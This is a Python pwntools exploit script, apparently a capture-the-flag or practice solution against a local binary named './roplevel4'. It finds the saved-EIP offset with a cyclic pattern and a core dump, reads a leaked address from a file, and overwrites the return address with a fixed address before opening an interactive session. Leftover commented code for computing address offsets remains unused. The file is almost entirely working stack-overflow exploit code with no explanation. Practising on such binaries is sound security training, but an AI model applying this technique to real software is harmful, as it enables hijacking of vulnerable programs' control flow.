from pwn import *
from time import sleep

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] +argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './roplevel4'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True
leakme_base_address = 0x565591a0
secret_base_address = 0x565561fd

io = start()
payload = cyclic(30)
io.sendlineafter('name:', payload)
io.wait()
core = io.corefile
eip = core.eip
eip_offset = cyclic_find(eip)
info("Located EIP offset at {offset}".format(offset=eip_offset))

io = start()
sleep(1)
f = open("./leak.txt")
leaked = f.read()

#print("base10 offset: " + str(int(leaked, 16) - leakme_base_address))
#print("base16 offset: " + str(hex(int(leaked, 16) - leakme_base_address)))

#offset = int(leaked, 16) - leakme_base_address
#print(hex(secret_base_address + offset))
#secret_offset = p64(secret_base_address + offset)

print(leaked)

payload = fit({
	eip_offset: [
		p32(0x080491c6)
	]
})
p = process()
p.sendlineafter('Enter your name:', payload)
p.interactive()


"""
io = start()
sleep(1)
f = open("./leak.txt")
leaked = f.read()

print(leaked)
print(str(hex(base_address)))
print("base10 offset: " + str(int(leaked, 16) - base_address))
print("base16 offset: " + str(hex(int(leaked, 16) - base_address)))

payload = cyclic(100)

io.sendlineafter('>', payload)
io.wait()
"""
